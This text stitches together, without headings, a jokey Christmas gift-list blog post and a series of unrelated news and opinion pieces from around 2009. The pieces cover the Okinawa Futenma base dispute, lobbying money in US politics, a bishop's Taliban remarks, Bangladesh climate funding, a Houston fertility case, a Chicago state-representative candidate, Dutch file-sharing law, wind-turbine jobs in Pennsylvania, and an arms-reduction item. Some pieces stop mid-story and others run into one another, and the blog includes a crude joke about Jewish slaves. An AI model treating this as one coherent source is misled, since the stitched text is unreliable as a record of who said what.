The Meditation Grotto of Sorrento
This is a Christmas gift not for a person , but for a yard .
The yard of The Other Official Uncle of Icarus Landing , Uncle Ernestus , just in case he ’s not already pissed off enough because , after all , it ’s Christmas !
This timeless , European - style grotto is 10 feet tall and about 420 pounds and , do n’t you agree ? , creates an instant , ‘ destination spot ’ for religious meditation in the middle of Uncle Ernestus ’s yard .
Did I mention he ’s an avowed atheist ?
Good times !
I think he should put it in his front yard , not his back , do n’t you ?
The King Tutankhamen ’s Egyptian Throne Chair
Jeez , there ’s a lot of Egyptian thematic content and subtext here .
What ’s that about ?
I do n’t know what makes me go all Egyptian when I get drinking at Christmas , but apparently , when drunk , Christmas reminds me of ancient Egypt and all the fun they had during the Christmas season getting Jewish slaves to make egg nog for them and wrap their presents and force Santa ’s elves to build their pyramids and stuff .
Must have been another life for me .
Yeah , that ’s it !
I get weepy and sentimental and think about ancient Egypt !
At $ 895 , who would n’t get weepy !
I will give this gift to The Official Brother of Icarus Landing , Christophacus , who , if you know him , know that he deserves a 185 pound throne in his house if anybody does !
Son , this is the gift that says your Dad knows you well and loves you lots !
The ‘ Christmas Story ’ Leg Lamp
One of those ‘ perfect ’ gifts for Icarus , because this is his favorite Christmas movie .
Only $ 199 , and totally worth it , and because the sheer black stocking style will look great in a contrasting way in his stylish , coolly contemporary , non-kitschy designer home .
It made Ralphie ’s Dad proud , it will do the same for Icarus !
And the Official Girlfriend of Icarus Landing , Karacus , will love it also .
The Legless Person ’s Portable Home
Keeping with the leg theme established above , this is for The Official Twin Brother of Icarus Landing , Brettacus , also step brother to Spartacus , who was , as you can guess by this photo , born with no torso .
This portable , tent - like little house will be perfect for him as right now he lives on a shelf in one of our closets .
Best thing about it ?
It prevents insulation dust particles from being pulled in !
You ’re welcome , son !!
This is like our own Tiny Tim at home getting saved in the end of A Christmas Carol , is n’t it ?
Just says I love you over and over again , without saying I wish you had a torso , son .
The Replica Captain Kirk’s Chair
Another perfect gift !
This one ’s for Skeets , The Official Cousin Skeets of Icarus Landing .
Yes , the first officially licensed replica features a working swivel design , light - up controls and , get this , sound effects from the legendary Star Trek series !
It will look fantastic in their living room !!!
And at only $ 2,717 [ actual price ] , will provide a lifetime of joy for Skeets and his family , especially his mother - in - law , who will never forget this !
The New Christmas Outfit
Why , for The Official Mother of Icarus Landing , Mrs. Daedalus , of course , and me .
Of course .
Mrs. Daedalus is a scientific curiosity – like Benjamin Button , she is aging in reverse !
It ’s true !
This year , several people who have n’t seen her in years said to her , “ You ’re looking younger ! ”
And she is !
These same people say nothing to me .
Fine , I get it .
Anyway , with one of these on , Christmas night will feel like high school again !!!
Hurray for Christmas !!!
Okay , that ’s it , everybody !
Hope you enjoy the IL Christmas and Holidays this year !
Catch you in the New Year !
The US yesterday told Japan the planned relocation of a US marine airbase and thousands of troops based on the southern Japanese island of Okinawa was not up for negotiation in a further sign of growing tensions over the future of the US military footprint in east Asia .
Reports said the US secretary of state , Hillary Clinton , told the Japanese ambassador to Washington , Ichiro Fujisaki , that Japan must honour a 2006 agreement to move the Futenma airbase – located in a crowded city on Okinawa – to the island 's remote east coast .
Fujisaki told reporters the discussion had centred on " the importance of US - Japan " ties , but Clinton reportedly made it clear that the US expected " swift implementation " of the existing accord .
Last week , the Japanese prime minister , Yukio Hatoyama , said he needed more time to determine the base 's future following electoral promises to lessen the Japanese dependence on US foreign policy .
The original $ 10.3 bn ( £ 6.4 bn ) relocation plan would also see the transfer of 8,000 marines and their families to the US Pacific territory of Guam by 2014 .
Discussions about the relocation began well over a decade ago amid mounting opposition to the US military presence on Okinawa , which hosts more than half the 47,000 US troops in Japan .
The bases are routinely blamed for noise and air pollution , and residents live with the threat of a catastrophic accident .
Although serious crimes are relatively uncommon , attitudes changed after three US servicemen were convicted of raping a 12 - year - old Okinawan girl in 1995 .
The Japanese defence minister , Toshimi Kitazawa , said Tokyo had set itself a May 2010 deadline to decide the base 's future , but added that he hoped an agreement would be reached sooner .
Japan 's decision to postpone a decision has been met with an exasperated reaction by US military officials .
Last week , General James Conway , the commandant of the US marine corps , said the delay was " unfortunate " , adding , " The Futenma replacement facility is absolutely vital to the defence that we provide for the entire region . "
Hatoyama 's indecision is also harming his popularity at home , about six months before upper house elections that could give his Democratic party of Japan control of both houses of parliament .
In a poll published by the Mainichi newspaper yesterday , 68 % of respondents said they were concerned about ties with the US .
The Futenma debacle and Hatoyama 's handling of the economy saw his cabinet 's approval rating slide to 55 % , down 9 % from last month , the poll revealed .
Almost four months after his party swept to power in a landslide election victory , Hatoyama appears no closer to reaching a decision on Futenma .
He could choose to honour the original agreement , but the delay suggests he is more sympathetic to moving the base to another part of Japan .
The social democratic party , a junior partner in Hatoyama 's coalition government , supports moving the base out of Japan and has threatened to leave the coalition if the existing accord is implemented .
Barack Obama 's irritation was evident earlier this month when the US president snubbed an offer from Hatoyama to explain his thinking on Futenma 's future on the sidelines of the climate change summit in Copenhagen .
Ralph Nader is famous for saying that there is not dime 's worth of difference between the Democratic and Republican parties .
Although I agree with the general sentiment , I do concede that there is a difference between the two parties , about $ 0.11 worth .
That issue is not the most pressing problem .
That problem is the unelected portions of our system that actively work against the citizen / taxpayer and any agenda arriving in Washington to cut out the entrenched deadwood .
It 's actually a small spectrum of choices that are presented to us but in a system as large as ours , shifts along that spectrum can amount to billions of dollars and affect thousands of lives for better or worse .
As much as it disgusts me to say , I think that we 're in a predictable electoral cycle .
After entrenched unelected power and its elected lackeys have an embarrassing string of failures , we elect some new “ leadership ” promising us a challenge to this entrenched deadwood .
All too easily , the deadwood gains control of the new “ leadership ” , disappointment follows , and we 're left with a choice between buffoon like lackeys that failed prior to this administration or the sold - out remnants of what promised to be new “ leadership ” .
Voter apathy ensues and the buffoons wind up back in power , leaving those whom we do not vote for in power alongside them and usually reaping in lots of our tax dollars !
We do not vote for organizations like the U.S. Chamber of Commerce , American Israel Public Affairs Committee , Health Insurance Association of America , or the American Bankers Association .
Yet these entities and entities like them are able to wield huge resources to influence our government .
Opensecrets.org estimates $ 2,558,205,882 was spent by lobbyists for the Finance , Insurance , and Real Estate Lobbying Clients between 1998 and 2006 .
You might be outraged at the Bush / Paulson Bailout last year , but when you look at those numbers can you really be all that shocked ?
Do you really think all that money would be spent greasing Republican and Democrats palms if it did nothing ?
When it was revealed that Paulson and Goldman execs met in Moscow , Russia to discuss the impending Bailout and how they were going to get the taxpayer to foot the bill , can you look at that amount of money spent and act surprised that they were confident they would get way with it ?
What passes for Health Care in this country has been a problem for most of my adult life .
In the above mentioned time period , the Health lobby spent $ 2,298,865,053 to influence policies that keep profits and infant mortality statistics right where they wanted them .
We do n't vote for these people .
They do n't even have to answer to “ the Democracy of the Market ” ( you know where we vote with our dollars ) , because a lot of these situations are not Perfect Competition as defined by Adam Smith .
These are Oligopolies , Monopolies and Controlled Monopolistic Competitions that are spending lots of money ( in some cases while subsidized ) to keep the playing field exactly where it is .
As a matter of fact , it does n't get more Protectionist than what Bush , Paulson and company pulled last year .
We did n't vote for the “ Fellowship ” of Douglas Coe either .
Though until recently , we taxpayers were subsidizing the C Street Center Boarding House .
Now elected Representatives and Family members Bart Stupak - D and Joe Pitts - R ( who has been allowed to write parts of the current Health Care proposal he has no intention of voting for ) have been through elections .
But the “ Family ” itself has not and remains a very secretive organization .
This is a secretive organization inside Washington D.C. who can count among those whom it influences many powerful social conservatives in Congress .
By the way , that same Douglas Coe who started this organization is on record as saying that he seeks “ a personal commitment to Jesus Christ , comparable to the blind devotion that Adolf Hitler , Josef Stalin , Chairman Mao , and Pol Pot demanded from their followers ” .
My senator , John Ensign , was among their followers .
One of the reasons I no longer bother contacting his office is that I do n't think I can say anything to influence someone who either believes that or even wants to be around people who believe that .
We did n't vote for any newspaper editor .
These are private publications and of course they can hire anyone they want to and institute any editorial policy they wish .
Even if they are owned by a megalomaniacal and ( by Christian standards ) blasphemous old man , they have rights nonetheless .
Sun Myung Moon started the Washington Times in 1982 “ in order to make propaganda ” .
This is also a man who has openly declared himself to be the second coming of Christ and held a coronation ceremony in the offices of our legislature with elected representatives of both parties kowtowing to him as he crowned himself !
Now that 's not an indictment of a conservative bias in the media at large .
For that I 'd have to rehash Noam Chomsky 's Manufacturing Consent .
Dr. Chomsky went to a lot more detail than I can in this column , but I 've found the basic themes of the book ( Propaganda model , the 5 filters of our news , what we find when we compare linespace / airtime , etc. ) to be proven true , especially over the past 8 years .
Part of the more enjoyable part of him being proven right is the hard times newspapers are having right now competing with online news .
Mainstream newspapers and media outlets have been putting out an inferior product for a long time now .
They deserve to close .
When I can read the mainstream brownnosing of President Obama 's trip to China in the mainstream media and then go online to the financial press and read how the whole issue of currency manipulation was avoided , the editors of the mainstream news media prove Chomsky right !
Not that it matters , ABC News , CNN , MSNBC , the New York Times ( let alone the more farcical propaganda outlets Washington Times , Fox News , NewsMax , etc. ) have no danger of losing their grip on the public receiving their version of current events .
My whole point is that a mere election is going to do nothing to “ vote the bums out ” !
Not these bums .
And that 's because we never voted for them to begin with !

The new bishop to the armed forces has apologised over comments he made about how the Taliban could be admired for their " conviction to their faith " .
The Right Reverend Dr Stephen Venner said his words had been taken out of context by the Daily Telegraph .
" I 'm not trying to support the Taliban , " he told the BBC .
" At the moment what they are doing is evil . "
He said he would be " deeply grieved " if anyone had taken offence and hoped he had not jeopardised his job .
Following his comments in Monday 's Daily Telegraph , one MP accused the bishop of giving " comfort and succour to the enemy " .
What you never do is give comfort to the enemy
Bob Russell MP
In his interview the Anglican bishop said the attitude taken towards the Taliban had been " too simplistic " .
Bishop Venner told the paper the insurgents could " perhaps be admired for their conviction to their faith and their sense of loyalty to each other " .
" There 's a large number of things that the Taliban say and stand for which none of us in the West could approve , but simply to say therefore that everything they do is bad is not helping the situation , " he told the paper .
' Very apologetic '
But in a BBC interview , he admitted it may have been naive to make such comments .
" I am not trying to support the Taliban , " he said .
" Very far from it .
I am very supportive of our forces .
Analysis by Robert Pigott , Religious Affairs Correspondent
The problem with Bishop Venner 's interview is partly that he misread the national mood .
After the deaths of so many servicemen and women , there 's little public appetite for distinguishing between more or less bad Taliban fighters .
There has also been surprise that a bishop should be unaware of the danger of seeming to praise any aspect of such a group , let alone their conviction in their faith .
British Muslim groups insist that the Islam practised by the Taliban is distorted and bears little comparison with their own faith .
They also point out that deep convictions can just make an extreme position even worse .
Bishop Venner accepts all these arguments , and says the interview was reported out of context .
He also points out that it was conducted three months ago , and circumstances have changed .
" And if what I 've said and the way it 's been reported , has caused offence , then of course I 'm deeply grieved , and very apologetic , and if that comes under the heading of naivety then I plead guilty . "
Bishop Venner said the way the interview had been written up had made his comments look " incredibly insensitive " .
He also insisted he had been talking about engaging with the Taliban once the military operation was over .
" It was one small phrase in quite a long interview , and a phrase that simply said you cannot describe everybody under one heading as Taliban as being equally black , equally evil , " he said .
" These are human beings and there are some amongst them who could - we do n't know - who could perhaps be people with whom at the end of the day we could do business . "
Some insurgents had been coerced into fighting or were ill - informed , he added .
Bishop Venner later released a statement , reiterating his " full support " to the British and allied troops .
" The way the Taliban are waging war in Afghanistan is evil , both in their use of indiscriminate killing and their terrorising of the civilian population .
No religion could condone their actions , " he said .
" I give my full support to the British and allied troops who are engaged in the country , seeking to work with the Afghan government to bring stability , democracy and an enduring peace . "
" Comfort and succour " Following the publication of Bishop Venner 's Daily Telegraph interview , the Liberal Democrat MP for the garrison town of Colchester , Bob Russell , said the bishop had given " comfort and succour to the enemy " .
" What you never do is give comfort to the enemy .
It is one thing for people to have respect for their enemy , but there is a world of difference here , " he said .
Mr Russell added the bishop should concentrate on " boosting the morale of our armed forces rather than boosting the morale of our enemy " .
Bishop Venner had previously been the Bishop of Dover and only recently took up his post as Bishop to the Armed Forces .
He will continue his role as Bishop for the Falkland Islands .

Up to 20 million people will be affected by rising sea levels in Bangladesh Bangladesh says it will ask for at least 15 % of any money which rich countries pledge to help developing nations cope with climate change .
Environment Minister Hasan Mahmud said Bangladesh was entitled to a big share of the money because it was the country most vulnerable to climate change .
He said 20 million Bangladeshis will be displaced if the sea rose by a metre .
Developed countries are discussing a so - called climate adaption fund at the UN summit in Copenhagen .
It is unclear how big any such fund would be , but UN officials have suggested a sum of about $ 30bn is needed in the short - term .
Technology transfer Dhaka has said it hopes to receive about $ 5 bn ( £ 3 bn ) over five years to combat the effects of climate change .
" We are the most vulnerable country to climate change and the world has already recognised that we need assistance for adaptation , " Mr Mahmud told a news conference in Dhaka .
The minister said that in addition to the millions who would be displaced by rising sea levels , many more would be affected if glaciers in the Himalayas melted due to global warming .
" The population of our one coastal district is bigger than the entire population of all island countries and in that consideration at least 15 % of any climate fund should come to us . "
Another demand of Bangladesh at the conference is easy transfer of technology from developed countries to those most vulnerable .
" We are not begging any mercy from anyone .
Rather we want justice as the worst victim of climate change , " Reuters news agency quoted Qazi Kholiquzzaman Ahmad , a leading economist who is also part of the Bangladesh negotiating team , as saying .
According to new research data made available in September this year , up to 20 million people in low - lying Bangladesh are at risk from rising sea levels in the coming decades .
Scientists predicted that salty water could reach far inland , making it hard to cultivate staple foods like rice .

It was the last piece of advice Thomas and Amanda Stansel wanted to hear .
But their fertility doctor was delivering it , without sugarcoating .
Reduce , or you will lose them all , he told them .
For more than a year the Stansels had been relying on Dr. George Grunert , one of the busiest fertility doctors in Houston , to produce his industry ’s coveted product  a healthy baby .
He was using a common procedure called intrauterine insemination , which involved injecting sperm into Mrs. Stansel ’s uterus after hormone shots .
But something had gone wrong .
In April , an ultrasound revealed that Mrs. Stansel was carrying not one but six babies , and Dr. Grunert was recommending a procedure known as selective reduction , in which some of the fetuses would be eliminated .
The Stansels rejected Dr. Grunert ’s advice and , since then , their vision of a family has collapsed into excruciating loss : the deaths of four children after their premature births on Aug. 4 , including one who died late Sunday night .
The two other infants remain in neonatal intensive care , their futures uncertain .
Most people who signed Joe Laiacona 's petition to run for state representative of the 40th District probably had no idea they were supporting a historic campaign .
That 's because Laiacona did n't tell them .
One evening in August I followed the 62 - year - old as he hoofed it down Sacramento between Irving Park and Addison .
Wearing a short - sleeve plaid shirt tucked into jeans , he said almost exactly the same thing to anyone who'd open the door : " Hi , I 'm Joe Laiacona .
I 'm running for state rep of the 40th District , and I 'm wondering if you 'd like to sign my petition .
It does n't mean you 'll vote for me .
It just means you 'll have a choice . "
Laiacona , a part - time computer science teacher at Columbia College , is running as a reformer against the incumbent , Deborah Mell , daughter of powerful 33rd Ward alderman Richard Mell .
With the help of veteran election lawyer Richard Means , Laiacona has filed a gutsy challenge to her nominating petition , alleging that she 's not a registered voter at her current residence .
That has election watchers buzzing , but it 's not what makes him a historic candidate .
And he 's an openly gay man going toe - to - toe with an out lesbian for state office in a working - class northwest - side district — a first .
But there 's more : if elected , Laiacona would be the first known leather master to take office in Illinois .
Under the alias Jack Rinella , Laiacona writes a popular column called " Leather Views , " which ran in Gay Chicago Magazine from 1992 to 2008 and can now be subscribed to by e-mail at LeatherViews.com .
He 's published seven books on sadomasochism , bondage , and role - playing , including The Master 's Manual : A Handbook of Erotic Dominance ( 1994 ) , Becoming a Slave : The Theory & Practice of Voluntary Servitude ( 2005 ) , and Philosophy in the Dungeon : The Magic of Sex & Spirit ( 2006 ) .
His writing , along with his lecture and seminar schedule , has made him a leader in the kinky community and a sort of Ann Landers in leather , and he has been tapping this underground group for financial support in his campaign .
Now some leaders in the fetish community worry Laiacona could sacrifice his role in their community in the process .
As a boy in Albany , New York , Laiacona wanted to be a priest .
In 1964 , at 17 , he tried enrolling at Mater Christi Seminary , but he says the priests turned him away because he was too young .
He instead went to Saint Michael 's , a Catholic liberal arts college in Vermont , and transferred to Mater Christi the next year .
But as it turned out , he did n't find life in the seminary compatible with his Christian beliefs — particularly his interpretation of the vow of poverty .
" I literally lived in a mansion , " he says , " with a car at my disposal — filled with gas — and all my bills paid . "
Laiacona transferred back to Saint Michael 's and graduated with a BA in philosophy in 1969 .
He got a teaching certificate at the University of Albany shortly thereafter , got a job teaching high school , and in 1971 married his girlfriend .
In 1977 they moved to Indiana , where Laiacona took a marketing gig at the Catholic publishing company Our Sunday Visitor , and raised their two daughters , both of whom are now in their 30s .
In 1982 , Laiacona earned a master 's in business administration from Indiana University - Purdue University in Fort Wayne .

The next year , Laiacona came out to his wife , causing the marriage to end in an acrimonious divorce .
" It was an enormous struggle for me , " he says .
" I had no choice .
I had to stop lying to the woman I loved the most in the world , even if it meant divorce , because the truth is important . "
Laiacona says he was laid off from Our Sunday Visitor in 1986 , by which time his ex-wife and kids had moved to New Jersey .
He tried starting his own new age publishing company but says the business was a " disaster " and almost left him bankrupt .
In 1991 he came to Chicago and took a job selling computers .
It was in that capacity that he walked into the Lakeview office of Gay Chicago Magazine , where he overheard publisher Ralph Gernhardt talking about finding a leather columnist .
Laiacona says he volunteered on the spot , though he had n't much experience writing about the subject — he'd published two " short stories " in another , now defunct gay magazine .
Craig Gernhardt , who took over Gay Chicago Magazine in 2005 , just before his dad died , says Ralph liked Laiacona 's clips and hired him , resulting in the creation of " Leather Views " and Jack Rinella .
Laiacona says he used a pseudonym to protect his oldest daughter , who was applying to colleges in Chicago .
He published his own name in the column for the first time in 1997 , in a piece on the difficulty of writing gay history with so many sources who were afraid to be named .
" I started to cough when I saw a photo of him dressed in a suit under the name Joe Laiacona , " says Gernhardt .
" He 's the leather guy .
He would come into the office in his leather garb . "
Gernhardt says he 's bothered that Laiacona 's campaign literature does n't mention his fetish work .
Laiacona says he wo n't deny his ties to the community if he 's asked about it , but that it 's not part of his campaign .
" I live an honest and authentic life , and I 'm not ashamed or guilty about anything I 've done in that regard , " he says .
" I 've written about healthy sexuality of a consensual adult nature , and I do n't believe the government has a role in my bedroom .
That 's the end of the discussion . "
Laiacona was laid off from his computer sales job in 1992 , the same year he started writing " Leather Views . "
Columbia College hired him in January 1994 , and a few years later he helped form a union for part - timers like himself .

Last winter , after the impeachment of Rod Blagojevich — Deb Mell 's brother - in - law — Laiacona hosted a union meeting at his house in Albany Park .
In his small , cozy living room , which is dominated by two big black leather couches , Laiacona discussed the scandal with fellow Columbia instructor Dan Sutherland .
" Joe , you got to run for office , " Sutherland said .
" Really ? " Laiacona asked .
" What should I run for ? "
Sutherland thought the state legislature , or maybe the Cook County Board .
In fact Laiacona had already been thinking about running against his own state rep , Deb Mell , who 'd voted no on impeaching her brother - in - law instead of abstaining .
But Sutherland 's suggestion pushed him off the fence — here was a guy he'd never even talked to before the union meeting , and he thought Laiacona was candidate material .
In June , says Laiacona 's partner , Patrick Herlihy , whom he frequently refers to as his slave in his columns , a friend of a friend hinted that they should look up Mell 's address .
Laiacona checked out her voter registration , which listed her as living on Clybourn .
Herlihy , who rides his bicycle past that address on his way to work , reported back that he saw a man 's name on the mailbox .
Then , in mid-October , Laiacona says , he was out gathering signatures when met a man doing the same for Mell .
Laiacona says he made the man a proposal : " I said , I 'll show you mine if you show me yours . "
Mell 's petition , he says , gave an address on Melrose Street .
Laiacona notes on his blog , joe4forty.blogspot.com , that his lawyer , Richard Means — " wise man or is it ' wise guy ' that he is " — waited until an hour before the deadline to file the challenge , which asserts : " Because Deborah L. Mell is not a duly registered voter at the address from which she seeks to be a candidate , the Nomination Papers are invalid in their entirety . "
( A PDF of the entire challege can be found here )
Mell did n't challenge Laiacona 's petition .
" Well , today it 's all history , " Laiacona continues on the blog , and " not only am I on the ballot but I have a good chance of being the only one . "
Political observers have been hooting over the daughter of Richard Mell making such a rookie mistake .
" She signed these petitions , so she must have seen them , " says Dick Simpson , the former Chicago alderman who teaches political science at the University of Illinois at Chicago .
" Maybe she 's distracted by the Blagojevich scandal . "
Knocking your opponent off the ballot on a technicality is a cherished election - season pastime in Chicago .
In his 1996 race for state senate , for instance , Barack Obama used petition challenges to get incumbent Alice Palmer and three other would - be candidates booted .
He ended up running unopposed — but Simpson does n't think Laiacona will be so lucky .
He says Mell could probably win the February 2 primary as a write - in candidate , especially given her father 's influence , or campaign as a Green Party or independent candidate in the general election next November .
And that 's assuming the Board of Elections even agrees with Laiacona 's argument or , if it does , that Mell and her own experienced election lawyer , Mike Kasper , would n't appeal the decision all the way up to the Illinois Supreme Court .
( Kasper says he does n't think Laiacona has a case ; he 's preparing his argument to that effect for a hearing slated for Tuesday , November 24 . )
Laiacona estimates it would cost him $ 20,000 to retain his lawyer for that long .
According to campaign disclosure forms submitted at the end of June to the Illinois Board of Elections ( the most recent available ) , Laiacona , who says he makes about $ 44,000 a year , had raised a little over $ 6,000 and spent more than $ 5,000 ; he declined to reveal whether he 's raised more since .
Mell , by contrast , had a little over $ 19,000 in the bank .
To defeat an incumbent like Mell , says Simpson , any candidate needs a serious fund - raising operation .
So far Laiacona does n't have one .
Collecting signatures back in August , he began reeling off the things he was n't accomplishing because he does n't have enough manpower .
" When I 'm collecting signatures , I can't update the blog , " he said , " and when I 'm updating the blog I can't raise money . "
Laiacona 's campaign is headquartered at the home he shares with Herlihy .
A campaign poster hangs in the large front window of the modest white house .
Inside , the dining room table is covered in stacks of envelopes and flyers .
As part of his fund - raising efforts , Laiacona is reaching out to fellow sadomasochists .
He has n't said what he would do specifically for the community if elected , though he has referred to " antiquated laws " that , if enforced , could be used against it .
But he says he raised $ 1,800 at one leather party , and he pitched members of the Next Generation Chicago , a pansexual BDSM group for the 18 - 34 set , at one of their meetings at the Leather Archives & Museum in Rogers Park .
He 's also used his column to enlist supporters by drawing parallels between being a reformer and a practitioner of sadomasochism .
" For years I have written about the necessity of being authentic , " Laiacona wrote under his real name on August 31 .
" I have extolled transparency , honesty , and trustworthiness .
I have suggested actions that I felt would benefit our community .
I have urged you , my readers , to be activists according to your particular situation and abilities .
The time is right for me to put my actions where my mouth has been . "
His published platform , at friendsforjoelaiacona.org / Platform.pdf , says he 's for , among other things , limiting campaign contributions by party leaders — a reform house speaker Michael Madigan has blocked in the past .
He 's for term limits for state representatives and senators .
He supports legislation to make it easier for unions to organize .
He 's pro medical marijuana and pro gay marriage .
And as part of his election - reform plank , he 's for curtailing " costly challenges to signatures on petitions . "
One of Laiacona 's biggest supporters is Chuck Renslow .
A precinct captain for 43rd Ward committeeman Dan O'Brien during the 70s , Renslow has long lobbied for gay rights , meeting with Chicago mayors going back to Richard J. Daley .
The 80 - year - old , who still helps organize International Mr. Leather , the pageant and fetish convention he cofounded in 1979 , now spends most of his days at Man's Country , the gay bathhouse he owns in Andersonville .
Renslow wrote Laiacona a letter back when he was writing for Gay Chicago Magazine , suggesting they meet , and the two became friends ; Renslow even helped Laiacona join the Freemasons .
Renslow too proposes that the same qualities that make a good master make a good political leader .
" When somebody puts themselves totally in your charge , they have to trust you , " he says from behind his large wooden desk at Man 's County .
" And not only do they have to trust you , but the person who is the top — or whatever you want to call it — has to have integrity that they wo n't hurt the person or damage them .
You can cause somebody pain that can be pleasurable , but not damage , and there 's a big difference . "
But Deb Mell wonders how effectively Laiacona can work within the state legislature given his kinky past .
" We can't get a civil unions bill passed and here 's a guy who 's . . . into bondage and sex slaves ? " she says .
But she also accuses Laiacona of " hiding " his ties to the kinky community .
" It 's a conservative bunch out here in the 40th District , so it probably works in his favor not to mention it . "
Even some people in his own community are debating Laiacona 's political viability .
In the inaugural edition of DungeonPlace .com 's FetishCast podcast , after a segment on whether sadomasochists should be considered experts on military torture , hosts Meow , Gryphon , Goddess , Tutivillus , and DarlingEvil discussed his campaign and what impact his work might have on his bid for state representative .
" This is a man that 's been open in the community , " said DarlingEvil . " [ I ] s the mainstream . . . going to look at that and say , ' Is this someone we want representing us in our government ? ' "
Then again , Gryphon joked later , in Chicago politics , he just might be " the lesser evil . "
Renslow says Laiacona 's facing growing pressure to become a public advocate for fetishists .
" What they should know is that he is on our side , " Renslow says .
" He ca n't come out and say , ' Oh , I 'm going to make a law . '
Whatever .
He can't do it .
What you 've got to understand , the first thing is to get elected . "
It 's a dilemma Renslow has thought plenty about .
In the 60s , he says , the legendary Cook County Democratic Central Committee chairman and county board president George Dunne approached him to run for office — alderman or maybe county board , he can't remember which .
Dunne had conducted a poll on possible gay candidates , and Renslow had the most name recognition .
But Renslow turned him down .
" I would have done more harm than good , " he says .
" My rivals would have made a big deal about ' the S & M clubs and people beating each other . ' "
Downloading copyrighted movies and music for personal has been legal in The Netherlands for years , but Dutch lawmakers are considering changing this in the future .
In a response , the local consumer rights organization has launched a pro-filesharing campaign which emphasizes that downloaders are not criminals .
Presently , downloading movies and music for personal use in The Netherlands is seen as “ fair use ” and not punishable by law .
However , in common with most other European countries , The Netherlands is trying to find a solution to the ever - increasing use of file - sharing sites to share copyrighted material .
One of the options for the government is to criminalize unauthorized downloading by making it punishable by law .
The entertainment industry , represented by Dutch anti-piracy group BREIN among others , have lobbied extensively for such a change .
Consumers , on the other hand , prefer to keep things the way they are right now .
Backing interests of the general public , Dutch consumer rights organization Consumentenbond has started a campaign where they defend the public ’s right to download copyrighted material without repercussions .
“ Sometimes I buy , sometimes I download , but I am not a criminal .. , ” is the message the consumer organization is trying to put across in the newly launched campaign .
The rationale behind the campaign is that the the entertainment industry has failed to provide sufficient legal alternatives to online piracy , leaving consumers no other choice than to consume online media through file - sharing sites .
“ At the moment , paid downloads do n’t offer any added value compared to unauthorized downloads , ” Bart Combée , Director of the Consumer Rights Organization said .
“ Before criminalizing consumers , the industry has to make sure that they offer a decent amount of content .
Once that improves , I think consumers are willing to pay , ” he added .
Previously , the consumer rights organization also stood up for users of The Pirate Bay , after the Amsterdam court ruled that the site should block Dutch users without reviewing the evidence carefully .
The present campaign reiterates what many others have said before .
There has to be a fair balance between the interests of multi-billion dollar companies and the individual rights of consumers .
And since a report commissioned by the Dutch government recently concluded that file - sharing actually has a positive effect on the economy , it might be best to keep things the way they are for now .
PITTSBURGH — Steelworkers tending blast furnaces and rolling mills in Pittsburgh 30 years ago could not have imagined that their jobs would turn so green , or that they would be working for foreign companies that needed their skills .
Because of the convergence of the right political and economic elements , Spain ’s Gamesa Corporacion Tecnologica , among the largest wind turbine generator manufacturers worldwide , put roots down in the United States in what would seem to be the most unlikely of places — on the carcasses of Pennsylvania steel mills that were famed for their power to pollute .
Since its arrival in the state in 2004 , Gamesa has become one of the drivers behind creating hundreds of unionized “ green - collar ” jobs and reducing carbon emissions from electrical generation .
It also is part of the renewal that has been going on in Pittsburgh and its environs after the demise of the steel industry beginning the in the 1970s .
Besides being a jobs generator , Gamesa ’s success in the U.S. is likely to be talked up around the world as an example of how the U.S. has been working to reduce carbon emissions with wind power .
The company , and others involved in renewable energy around Pittsburgh , also got attention last fall when the G20 nations met here .
Gamesa was a Pennsylvania campaign stop for President Barack Obama to talk up renewable energy and green jobs .
Gamesa ’s $ 200 million investment in its Pennsylvania facilities also has been held up as a template for retrofitting hulking old industrial sites into clean manufacturing facilities that are still closely linked to steel : 90 percent of the weight of a wind turbine is made of steel — or 250 tons of steel go into every turbine that goes up .
The company employs 700 workers in the state , primarily at a blade plant in Ebensburg , which is 90 minutes from Pittsburgh , and a turbine facility in Fairless Hills , near Philadelphia , on the site of an old U.S. Steel plant .
Gamesa ’s growth has created green jobs at other local companies that have long histories in Pittsburgh .
PPG Industries Inc. , a Gamesa supplier , was founded in the 1800s as a plate - glass and paint company .
More than 100 of the company ’s subcontractors are in the state and the facilities have attracted foreign investment from companies such as Hine S.A. in Spain , which makes hydraulic systems used in wind turbine generators .
“ We ’d like to have everyone in Pennsylvania come and work for us and be the wind energy supply center of the country , ” said Michael Peck , director of external relations for Gamesa North America , whose headquarters are in Philadelphia .
It looked like that was going to happen until the economic downturn hit , curtailing orders for the giant towers and turbines as the financing for the development of wind farms tightened after a boom year in 2008 .
Adding to bankers ’ unwillingness to lend is the lack of regulatory certainty , both in what happens with the Copenhagen accord and in Congress with climate change legislation , which is supposed to set targets for reducing greenhouse gas and establish a cap - and - trade system for industry .
Those loose ends lead to regulatory uncertainly — the bane of any growing industry .
Peck said the industry would like commitments on how much of the nation ’s energy portfolio will be dedicated to renewable energy , which would create an instant market boost for wind manufacturing and installations , keeping the U.S. as the world ’s largest market for production , generation and new installations .
The wind industry has been lobbying for a national renewable electricity standard of at least 25 percent by 2025 .
The industry argues that with the right incentives and new technology , wind power could account for 20 percent of the U.S. electrical supply in 20 years .
Pennsylvania ’s energy portfolio calls for the use of 18 percent of the state ’s electricity to come from renewables by 2021 .
“ You set a floor for expectations and that ’s what drives the investment , " said Peck .
Overall , the industry has seen a slowdown in the growth rate of wind power installations , estimating a 20 percent rate this year compared with a 50 percent one in 2008 .
The slowdown has hit Gamesa .
About 150 workers in Ebensburg will be on temporary layoff or reassignment starting next month .
In the meantime , the company is upgrading the facility to be ready when orders come in again .
Previously , every blade made at the plant was sold .
Most of the jobs that have been created in Pennsylvania have roots in the steel industry .
The United Steelworkers unionized the facilities as part of its goal to create high - paying jobs that also are environmentally sound .
The fabrication of wind turbines relies on experienced machinists , welders and other skilled workers .
Former coal and steel workers often fit the bill .
Rob Witherell , a representative of the Steelworkers in Pittsburgh , said when news got out that Gamesa was hiring in Ebensburg , 3,000 applicants showed up for 200 jobs .
Troy Galloway was one of the hires .
A steelworker in Johnstown who got laid off after 15 years with U.S. Steel , Galloway tried to sell real estate and started a construction company .
Neither could support his family .
In 2006 , he landed on Gamesa ’s payroll , using his machining and computer skills at the new Ebensburg facility .
“ It ’s a feel - good job , ” said Galloway , “ because you know you are doing something good for the environment . ”
He said he gets to see the fruits of his labor in the blades ’ plant when he sees a local wind farm on his way to work everyday .
“ It ’s heat in the winter and air - conditioning in the summer , ’ said Galloway .
“ You did n’t see that in the mills . ”
MOSCOW ( Reuters ) - Russia and the United States plan unprecedented cuts to their Cold War arsenals of nuclear weapons under a new arms reduction deal , Russian Foreign Minister Sergei Lavrov was quoted as saying on Tuesday .
